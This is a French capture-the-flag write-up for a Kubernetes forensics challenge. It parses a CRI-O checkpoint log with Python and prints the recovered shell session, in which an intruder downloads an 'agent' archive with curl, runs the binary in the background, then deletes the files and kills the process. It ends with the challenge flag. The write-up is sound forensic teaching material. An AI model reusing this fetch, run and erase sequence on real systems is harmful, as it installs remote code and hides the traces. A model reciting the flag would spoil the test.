---
layout: default
type: writeup
title: Les Mystères du cluster de la Comtesse de Ségur [1/2]
category: Analyse forensique
point: 348
files: ['checkpoint-bash_default-bash-2023-05-06T090421Z.zip']
---

{% raw %}
> **title:** Les Mystères du cluster de la Comtesse de Ségur [1/2]
>
> **category:** Analyse forensique
>
> **difficulty:** Moyen
>
> **point:** 348
>
> **author:** Typhlos#9037
>
> **description:**
> Vous rencontrez la Comtesse de Ségur au Procope.  La Comtesse de Ségur a créé une entreprise de vente de livres en ligne en s'aidant du succès de ses livres pour enfants et l'a déployé sur un cluster Kubernetes.
> 
> Celle-ci vous explique avoir été victime d'une demande de rançon. En effet, quelqu'un lui a volé ses livres pas encore publiés et menace de les publier sur Internet si elle ne lui paye la rançon demandée.
> 
> La Comtesse vous demande d'enquêter sur la manière dont le maître chanteur a pu voler ses livres et vous donne pour cela les informations à sa disposition.
> 
> ***
> 
> Votre mission consiste à exploiter le fichier fourni pour y retrouver les traces du maître chanteur.
> 
> ***
> 
> La 2e partie est en rétro-ingénierie.

## Solution

Le fichier nommé **`io.kubernetes.cri-o.LogPath`** est intéressant mais il faut le parser.

En python cela donne :

```python
data = open('checkpoint-bash_default-bash-2023-05-06T090421Z/io.kubernetes.cri-o.LogPath').readlines()
lines = []
for line in data:
	if line.startswith('2023-05-12'):
		lines.append(line)
	else:
		lines[-1] += line

lines = [line.split('stdout ')[1].split(' ', 1) for line in lines]
for line in lines:
	print(line[1][:-1], end='')
```

```
(Reading database ... 55%
(Reading database ... 60%
(Reading database ... 65%(Reading database ... 70%(Reading database ... 75%(Reading database ... 80%(Reading database ... 85%(Reading database ... 90%(Reading database ... 95%(Reading database ... 100%
(Reading database ... 7138 files and directories currently installed.)Preparing to unpack .../xxd_2%3a8.2.2434-3+deb11u1_amd64.deb ...7Progress: [  0%] [.................................................................................................................................] 87Progress: [  5%] [######...........................................................................................................................] 8Unpacking xxd (2:8.2.2434-3+deb11u1) ...7Progress: [ 10%] [############.....................................................................................................................] 8Selecting previously unselected package vim-common.Preparing to unpack .../vim-common_2%3a8.2.2434-3+deb11u1_all.deb ...7Progress: [ 14%] [##################...............................................................................................................] 8Unpacking vim-common (2:8.2.2434-3+deb11u1) ...7Progress: [ 19%] [########################.........................................................................................................] 8Selecting previously unselected package libgpm2:amd64.Preparing to unpack .../libgpm2_1.20.7-8_amd64.deb ...7Progress: [ 24%] [##############################...................................................................................................] 8Unpacking libgpm2:amd64 (1.20.7-8) ...7Progress: [ 29%] [####################################.............................................................................................] 8Selecting previously unselected package vim-runtime.Preparing to unpack .../vim-runtime_2%3a8.2.2434-3+deb11u1_all.deb ...7Progress: [ 33%] [##########################################.......................................................................................] 8Adding 'diversion of /usr/share/vim/vim82/doc/help.txt to /usr/share/vim/vim82/doc/help.txt.vim-tiny by vim-runtime'Adding 'diversion of /usr/share/vim/vim82/doc/tags to /usr/share/vim/vim82/doc/tags.vim-tiny by vim-runtime'Unpacking vim-runtime (2:8.2.2434-3+deb11u1) ...7Progress: [ 38%] [#################################################................................................................................] 8Selecting previously unselected package vim.Preparing to unpack .../vim_2%3a8.2.2434-3+deb11u1_amd64.deb ...7Progress: [ 43%] [#######################################################..........................................................................] 8Unpacking vim (2:8.2.2434-3+deb11u1) ...7Progress: [ 48%] [#############################################################....................................................................] 8Setting up libgpm2:amd64 (1.20.7-8) ...7Progress: [ 52%] [###################################################################..............................................................] 87Progress: [ 57%] [#########################################################################........................................................] 8Setting up xxd (2:8.2.2434-3+deb11u1) ...7Progress: [ 62%] [###############################################################################..................................................] 87Progress: [ 67%] [#####################################################################################............................................] 8Setting up vim-common (2:8.2.2434-3+deb11u1) ...7Progress: [ 71%] [############################################################################################.....................................] 87Progress: [ 76%] [##################################################################################################...............................] 8Setting up vim-runtime (2:8.2.2434-3+deb11u1) ...7Progress: [ 81%] [########################################################################################################.........................] 87Progress: [ 86%] [##############################################################################################################...................] 8Setting up vim (2:8.2.2434-3+deb11u1) ...7Progress: [ 90%] [####################################################################################################################.............] 8update-alternatives: using /usr/bin/vim.basic to provide /usr/bin/vim (vim) in auto modeupdate-alternatives: using /usr/bin/vim.basic to provide /usr/bin/vimdiff (vimdiff) in auto modeupdate-alternatives: using /usr/bin/vim.basic to provide /usr/bin/rvim (rvim) in auto modeupdate-alternatives: using /usr/bin/vim.basic to provide /usr/bin/rview (rview) in auto modeupdate-alternatives: using /usr/bin/vim.basic to provide /usr/bin/vi (vi) in auto modeupdate-alternatives: using /usr/bin/vim.basic to provide /usr/bin/view (view) in auto modeupdate-alternatives: using /usr/bin/vim.basic to provide /usr/bin/ex (ex) in auto modeupdate-alternatives: using /usr/bin/vim.basic to provide /usr/bin/editor (editor) in auto mode7Progress: [ 95%] [##########################################################################################################################.......] 8Processing triggers for libc-bin (2.31-13+deb11u6) ...78root@bash:/# curl agent.challenges.404ctf.fr -o agent.zip  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
100 1544k  100 1544k    0     0   251M      0 --:--:-- --:--:-- --:--:--  251Mroot@bash:/# mv out.txt /rroot/ run/  root@bash:/# mv out.txt /root/root@bash:/# mv agent.zip /root/root@bash:/# cd /root/root@bash:~# lsagent.zip  out.txtroot@bash:~# unzip agent.zip Archive:  agent.zip  inflating: agent                     inflating: flag.txt                root@bash:~# export HONEYPOT=trueroot@bash:~# ./agent&[1] 9317root@bash:~# rm agent agent.zip flag.txt root@bash:~# 
root@bash:~# kill -9 9317root@bash:~#
```

Dans les dernières lignes, on peut voir : 

**`curl agent.challenges.404ctf.fr -o agent.zip`**

Si l'on télécharge le fichier, à l'intérieur on trouvera **`flag.txt`**

<br>

**`FLAG : 404CTF{K8S_checkpoints_utile_pour_le_forensic}`**

{% endraw %}